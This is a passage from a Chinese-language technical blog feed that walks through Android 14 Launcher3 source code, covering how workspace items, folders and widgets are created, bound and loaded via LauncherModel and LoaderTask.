class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_APPWIDGET:</span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_CUSTOM_APPWIDGET: &#123;</span><br><span class="line">                <span class="comment">// *********3、重点关注 ********</span></span><br><span class="line">                view = inflateAppWidget((LauncherAppWidgetInfo) item);</span><br><span class="line">                <span class="keyword">if</span> (view == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Invalid Item Type&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码有三个需要重点关注的位置： <strong>createShortcut(info)</strong> 、 <strong>inflateFolderAndIcon()</strong> 、 <strong>inflateAppWidget()</strong> 。</p><h4 id="4-2-1-第一个关注点-createShortcut-info"><a href="#4-2-1-第一个关注点-createShortcut-info" class="headerlink" title="4.2.1 第一个关注点 createShortcut(info)"></a>4.2.1 第一个关注点 createShortcut(info)</h4><p>第一个重点关注<strong>Launcher#createShortcut()</strong>:<br><strong>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建表示从指定资源扩展的快捷方式的视图。</span></span><br><span class="line"><span class="keyword">public</span> View <span class="title function_">createShortcut</span><span class="params">(ViewGroup parent, WorkspaceItemInfo info)</span> &#123;</span><br><span class="line">    <span class="type">BubbleTextView</span> <span class="variable">favorite</span> <span class="operator">=</span> (BubbleTextView) LayoutInflater.from(parent.getContext())</span><br><span class="line">            .inflate(R.layout.app_icon, parent, <span class="literal">false</span>);</span><br><span class="line">    favorite.applyFromWorkspaceItem(info);</span><br><span class="line">    favorite.setOnClickListener(ItemClickHandler.INSTANCE);</span><br><span class="line">    favorite.setOnFocusChangeListener(mFocusHandler);</span><br><span class="line">    <span class="keyword">return</span> favorite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面又有三个关键方法，非常值得关注。<br>第一个 <strong>BubbleTextView#applyFromWorkspaceItem()</strong> :</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/BubbleTextView.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@UiThread</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">applyFromWorkspaceItem</span><span class="params">(WorkspaceItemInfo info, <span class="type">boolean</span> promiseStateChanged)</span> &#123;</span><br><span class="line">    <span class="comment">// 设置应用图标、应用名称</span></span><br><span class="line">    applyIconAndLabel(info); </span><br><span class="line">    setItemInfo(info);</span><br><span class="line">    <span class="comment">// 如果此应用程序正在安装，进度条将随着安装进度更新</span></span><br><span class="line">    applyLoadingState(promiseStateChanged); </span><br><span class="line">    <span class="comment">// 设置、删除绿点；因为首次安装的应用有个绿点</span></span><br><span class="line">    applyDotState(info, <span class="literal">false</span> <span class="comment">/* animate */</span>);</span><br><span class="line">    <span class="comment">// 设置下载状态内容说明；例如：下载中、暂停</span></span><br><span class="line">    setDownloadStateContentDescription(info, info.getProgressLevel());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个 <strong>favorite.setOnClickListener(ItemClickHandler.INSTANCE)</strong> 这里传入的是 <strong>ItemClickHandler</strong> 中的 <strong>OnClickListener</strong> 。设置图标点击事件，看 <strong>ItemClickHandler#onClick()</strong>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="comment">// 确保在所有应用程序启动时或在视图分离后</span></span><br><span class="line">    <span class="comment">// （如果视图在触摸中途被移除，可能发生这种情况），恶意点击不会通过。</span></span><br><span class="line">    <span class="keyword">if</span> (v.getWindowToken() == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">Launcher</span> <span class="variable">launcher</span> <span class="operator">=</span> Launcher.getLauncher(v.getContext());</span><br><span class="line">    <span class="keyword">if</span> (!launcher.getWorkspace().isFinishedSwitchingState()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">tag</span> <span class="operator">=</span> v.getTag();</span><br><span class="line">    <span class="keyword">if</span> (tag <span class="keyword">instanceof</span> WorkspaceItemInfo) &#123;</span><br><span class="line">        <span class="comment">// 应用程序快捷方式单击的事件处理。也是调用到：startAppShortcutOrInfoActivity() 方法。</span></span><br><span class="line">        onClickAppShortcut(v, (WorkspaceItemInfo) tag, launcher);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tag <span class="keyword">instanceof</span> FolderInfo) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v <span class="keyword">instanceof</span> FolderIcon) &#123;</span><br><span class="line">            <span class="comment">// 单击文件夹图标的事件处理程序</span></span><br><span class="line">            onClickFolderIcon(v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tag <span class="keyword">instanceof</span> AppInfo) &#123;</span><br><span class="line">        <span class="comment">// 启动应用程序快捷方式或信息活动</span></span><br><span class="line">        startAppShortcutOrInfoActivity(v, (AppInfo) tag, launcher);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tag <span class="keyword">instanceof</span> LauncherAppWidgetInfo) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v <span class="keyword">instanceof</span> PendingAppWidgetHostView) &#123;</span><br><span class="line">            <span class="comment">// 尚未完全恢复的应用小部件视图的事件处理程序</span></span><br><span class="line">            onClickPendingWidget((PendingAppWidgetHostView) v, launcher);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tag <span class="keyword">instanceof</span> SearchActionItemInfo) &#123;</span><br><span class="line">        <span class="comment">// SearchActionItemInfo 点击的事件处理程序</span></span><br><span class="line">        onClickSearchAction(launcher, (SearchActionItemInfo) tag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三个 favorite.setOnFocusChangeListener(mFocusHandler)： 外接键盘选择功能。被focus的图标会有灰色背景显示被选中。此外还有一定动画效果，都在focus类里。<br>第一个关注 Launcher#createShortcut() 方法就到此结束。</p><h4 id="4-2-2-第二个关注点-inflateFolderAndIcon"><a href="#4-2-2-第二个关注点-inflateFolderAndIcon" class="headerlink" title="4.2.2 第二个关注点 inflateFolderAndIcon()"></a>4.2.2 第二个关注点 inflateFolderAndIcon()</h4><p>接下来看第二个关注的方法 FolderIcon#inflateFolderAndIcon():<br><strong>packages/apps/Launcher3/src/com/android/launcher3/folder/FolderIcon.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Context</span> &amp; ActivityContext&gt; FolderIcon <span class="title function_">inflateFolderAndIcon</span><span class="params">(<span class="type">int</span> resId,</span></span><br><span class="line"><span class="params">        T activityContext, ViewGroup group, FolderInfo folderInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// folder 图标的生成是一个名叫 fromXml() 的方法</span></span><br><span class="line">    <span class="type">Folder</span> <span class="variable">folder</span> <span class="operator">=</span> Folder.fromXml(activityContext);</span><br><span class="line">    <span class="comment">// FolderIcon是文件夹的图标，Folder是打开时的文件夹。</span></span><br><span class="line">    <span class="type">FolderIcon</span> <span class="variable">icon</span> <span class="operator">=</span> inflateIcon(resId, activityContext, group, folderInfo);</span><br><span class="line">    folder.setFolderIcon(icon);</span><br><span class="line">    folder.bind(folderInfo);</span><br><span class="line">    icon.setFolder(folder);</span><br><span class="line">    <span class="keyword">return</span> icon;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里注意：FolderIcon是文件夹的图标，Folder 是打开时的文件夹 (不是里面的应用图标)。</p></blockquote><p>到这里可以发现应用图标是 <strong>textview</strong> 而文件夹是 <strong>FrameLayout</strong>。后面就不过多介绍了，和应用一样生成名字，大小，click，focus 等。</p><h4 id="4-2-3-第三个关注点-inflateAppWidget"><a href="#4-2-3-第三个关注点-inflateAppWidget" class="headerlink" title="4.2.3 第三个关注点 inflateAppWidget()"></a>4.2.3 第三个关注点 inflateAppWidget()</h4><p>最后看第三个关注点 <strong>Launcher#inflateAppWidget()</strong> ，看里面的 <strong>AppWidgetHost.createView()</strong> :</p><p><strong>frameworks/base/core/java/android/appwidget/AppWidgetHost.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> AppWidgetHostView <span class="title function_">createView</span><span class="params">(Context context, <span class="type">int</span> appWidgetId,</span></span><br><span class="line"><span class="params">        AppWidgetProviderInfo appWidget)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (sService == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// AppWidgetHostView 继承至 FrameLayout</span></span><br><span class="line">    <span class="type">AppWidgetHostView</span> <span class="variable">view</span> <span class="operator">=</span> onCreateView(context, appWidgetId, appWidget);</span><br><span class="line">    view.setInteractionHandler(mInteractionHandler);</span><br><span class="line">    <span class="comment">// 设置此视图将显示的AppWidget</span></span><br><span class="line">    view.setAppWidget(appWidgetId, appWidget);</span><br><span class="line">    <span class="keyword">synchronized</span> (mViews) &#123;</span><br><span class="line">        mViews.put(appWidgetId, view);</span><br><span class="line">    &#125;</span><br><span class="line">    RemoteViews views;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        views = sService.getAppWidgetViews(mContextOpPackageName, appWidgetId);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;system server dead?&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    view.updateAppWidget(views);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> view;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上 <strong>bindItems</strong> 就是按照分类把每种类型的桌面的 view 一个一个的创造出来。完成了当前屏幕的绘制，而后进行其他屏幕的 view 绘制。都在同一个方法调用绑定 <strong>BaseLoaderResults#bind()</strong> ，只是传入的 list 为 <strong>otherWorkspaceItems</strong> 和 <strong>otherAppWidgets</strong> 。</p><p>至此 <strong>Workspace</strong> 的数据加载与绑定结束。这里当我注释掉 <strong>loadAllApps()</strong> 后，当前屏幕是有应用图标的(我这是：相册、Google助理、Play商店、最下面电话、短信等图标都有) ，但上滑界面进入到 AllApps 界面时，没有任何图标。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 Launcher 数据加载分析（二）</title>
      <link href="/2024/02/16/2024-02-16/"/>
      <url>/2024/02/16/2024-02-16/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面一篇 launcher 基础认识中，有分析到 Launcher.java 这个类，在该类的 onCreate() 方法中，有 launcher 布局相关的初始化。这里还是从 onCreate() 方法出发，进行深入。<br> 说到数据加载，就不得不提到 <strong>launcher#onCreate()</strong> 方法，上篇说到该方法里面有布局相关的初始化，也是在  <strong>launcher#onCreate()</strong> 方法开始的。<br>先看 <strong>launcher#onCreate()</strong> 的部分代码：<br><strong>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 初始化View，进行各种View的初始化事件绑定</span></span><br><span class="line">    setupViews();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">    <span class="comment">// 加载、绑定数据（这里与之前版本的 startLoader() 作用一样）</span></span><br><span class="line">    <span class="comment">// 重点关注 addCallbacksAndLoad()</span></span><br><span class="line">    <span class="keyword">if</span> (!mModel.addCallbacksAndLoad(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!internalStateHandled) &#123;</span><br><span class="line">            Log.d(BAD_STATE, <span class="string">&quot;Launcher onCreate not binding sync, prevent drawing&quot;</span>);</span><br><span class="line">            <span class="comment">// If we are not binding synchronously, pause drawing until initial bind complete,</span></span><br><span class="line">            <span class="comment">// so that the system could continue to show the device loading prompt</span></span><br><span class="line">            mOnInitialBindListener = Boolean.FALSE::booleanValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码调用了 <strong>LauncherModel</strong> 中的 <strong>addCallbacksAndLoad()</strong> 方法，一起看 <strong>LauncherModel#addCallbacksAndLoad()</strong> ：<br><strong>packages/apps/Launcher3/src/com/android/launcher3/LauncherModel.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addCallbacksAndLoad</span><span class="params">(Callbacks callbacks)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        addCallbacks(callbacks);</span><br><span class="line">        <span class="comment">// 重点关注</span></span><br><span class="line">        <span class="keyword">return</span> startLoader(<span class="keyword">new</span> <span class="title class_">Callbacks</span>[] &#123; callbacks &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 该方法是加载程序的启动，在启动过程中并对于数据进行尝试同步绑定，</span></span><br><span class="line"><span class="comment">// 若能够进行绑定则可以返回true，在实现的过程中调用的是工作线程LoaderTask</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">startLoader</span><span class="params">(Callbacks[] newCallbacks)</span> &#123;</span><br><span class="line">    <span class="comment">// Enable queue before starting loader. It will get disabled in Launcher#finishBindingItems</span></span><br><span class="line">    ItemInstallQueue.INSTANCE.get(mApp.getContext())</span><br><span class="line">            .pauseModelPush(ItemInstallQueue.FLAG_LOADER_RUNNING);</span><br><span class="line">    <span class="keyword">synchronized</span> (mLock) &#123;</span><br><span class="line">        <span class="comment">// 对于旧的运行项进行一个清除</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">wasRunning</span> <span class="operator">=</span> stopLoader();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">bindDirectly</span> <span class="operator">=</span> mModelLoaded &amp;&amp; !mIsLoaderTaskRunning;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">bindAllCallbacks</span> <span class="operator">=</span> wasRunning || !bindDirectly || newCallbacks.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> Callbacks[] callbacksList = bindAllCallbacks ? getCallbacks() : newCallbacks;</span><br><span class="line">        <span class="keyword">if</span> (callbacksList.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 在同步加载过程中对于所有挂起的绑定可运行项进行清除</span></span><br><span class="line">            <span class="keyword">for</span> (Callbacks cb : callbacksList) &#123;</span><br><span class="line">                MAIN_EXECUTOR.execute(cb::clearPendingBinds);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">LoaderResults</span> <span class="variable">loaderResults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoaderResults</span>(</span><br><span class="line">                    mApp, mBgDataModel, mBgAllAppsList, callbacksList);</span><br><span class="line">            <span class="keyword">if</span> (bindDirectly) &#123;</span><br><span class="line">                <span class="comment">// 此处为数据恢复机制，例如：子用户切换到住用户时，会走到这一分支</span></span><br><span class="line">                <span class="comment">// 将同步项绑定于workspace、allapps、快捷方式、桌面小组件</span></span><br><span class="line">                loaderResults.bindWorkspace(bindAllCallbacks);</span><br><span class="line">                loaderResults.bindAllApps();</span><br><span class="line">                loaderResults.bindDeepShortcuts();</span><br><span class="line">                loaderResults.bindWidgets();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 数据加载，首次启动时 mModelLoaded 为 false，会走到这一分支</span></span><br><span class="line">                stopLoader();  <span class="comment">// 当有加载任务正在运行时则进行其停止运行</span></span><br><span class="line">                <span class="comment">// 对于LocalderTask进行启动：</span></span><br><span class="line">                mLoaderTask = <span class="keyword">new</span> <span class="title class_">LoaderTask</span>(</span><br><span class="line">                        mApp, mBgAllAppsList, mBgDataModel, mModelDelegate, loaderResults);</span><br><span class="line">                <span class="comment">// 发布加载程序任务</span></span><br><span class="line">                MODEL_EXECUTOR.post(mLoaderTask);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码，我们重点关注 LoaderTask.java ，分析数据如何加载，先看 LoaderTask 的构造方法 <strong>LoaderTask.java</strong> ：</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/model/LoaderTask.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LoaderTask</span><span class="params">(LauncherAppState app, AllAppsList bgAllAppsList, BgDataModel dataModel,</span></span><br><span class="line"><span class="params">        ModelDelegate modelDelegate, LoaderResults results)</span> &#123;</span><br><span class="line">    mApp = app;</span><br><span class="line">    mBgAllAppsList = bgAllAppsList;</span><br><span class="line">    mBgDataModel = dataModel;</span><br><span class="line">    mModelDelegate = modelDelegate;</span><br><span class="line">    mResults = results;</span><br><span class="line">    <span class="comment">// LauncherApps：用于检索当前用户和任何关联的托管配置文件的可启动活动列表的类。 这主要是供发射器使用的。 应用程序可以查询每个用户配置文件。</span></span><br><span class="line">    <span class="comment">// 由于PackageManager不会为其他配置文件传送包广播，因此您可以在此注册包更改。要监视正在添加或删除的托管配置文件，请注册以下广播： ACTION_MANAGED_PROFILE_ADDED、ACTION_MANAGED_PROFILE_REMOVED；</span></span><br><span class="line">    <span class="comment">// 从 Android O 开始，托管配置文件中的应用程序不再允许访问主配置文件中的应用程序。应用程序只能访问 &#123;@link getProfiles()&#125; 返回的配置文件。</span></span><br><span class="line">    mLauncherApps = mApp.getContext().getSystemService(LauncherApps.class);</span><br><span class="line">    <span class="comment">// 与多用户相关，在多用户系统上管理用户和用户详细信息。</span></span><br><span class="line">    mUserManager = mApp.getContext().getSystemService(UserManager.class);</span><br><span class="line">    mUserCache = UserCache.INSTANCE.get(mApp.getContext());</span><br><span class="line">    <span class="comment">// 跟踪应用安装会话的实用程序类</span></span><br><span class="line">    mSessionHelper = InstallSessionHelper.INSTANCE.get(mApp.getContext());      </span><br><span class="line">    <span class="comment">// 获取 图标管理工具 对象</span></span><br><span class="line">    mIconCache = mApp.getIconCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着看 <strong>LoaderTask#run()</strong> ：<br><strong>packages/apps/Launcher3/src/com/android/launcher3/model/LoaderTask.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果已经停止，则快速跳过</span></span><br><span class="line">        <span class="keyword">if</span> (mStopped) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">traceToken</span> <span class="operator">=</span> TraceHelper.INSTANCE.beginSection(TAG);</span><br><span class="line">    <span class="type">TimingLogger</span> <span class="variable">logger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TimingLogger</span>(TAG, <span class="string">&quot;run&quot;</span>);</span><br><span class="line">    <span class="type">LoaderMemoryLogger</span> <span class="variable">memoryLogger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoaderMemoryLogger</span>();</span><br><span class="line">    <span class="comment">// 这里与 LauncherModel.LoaderTransaction 关联上</span></span><br><span class="line">    <span class="keyword">try</span> (LauncherModel.<span class="type">LoaderTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> mApp.getModel().beginLoader(<span class="built_in">this</span>)) &#123;</span><br><span class="line">        List&lt;ShortcutInfo&gt; allShortcuts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;LoadWorkspace&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 第一步：加载工作区。****重点关注****</span></span><br><span class="line">            loadWorkspace(allShortcuts, memoryLogger);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            Trace.endSection();</span><br><span class="line">        &#125;</span><br><span class="line">        logASplit(logger, <span class="string">&quot;loadWorkspace&quot;</span>);</span><br><span class="line">        <span class="comment">// 根据从数据库加载的工作空间，清理数据重新同步小部件快捷方式。</span></span><br><span class="line">        <span class="comment">// 如果桌面(workspace)是从 不变设备配置文件中定义的主数据库不同的数据库加载的，则不应调用 sanitizeData。 </span></span><br><span class="line">        <span class="comment">// 例如，网格预览和最小设备模式都使用不同的数据库</span></span><br><span class="line">        <span class="comment">// mDbName 在 loadWorkspace() 方法里赋值</span></span><br><span class="line">        <span class="keyword">if</span> (mApp.getInvariantDeviceProfile().dbFile.equals(mDbName)) &#123;</span><br><span class="line">            verifyNotStopped();</span><br><span class="line">            sanitizeData();</span><br><span class="line">            logASplit(logger, <span class="string">&quot;sanitizeData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        verifyNotStopped();</span><br><span class="line">        <span class="comment">// 绑定 workspace</span></span><br><span class="line">        mResults.bindWorkspace(<span class="literal">true</span> <span class="comment">/* incrementBindId */</span>);</span><br><span class="line">        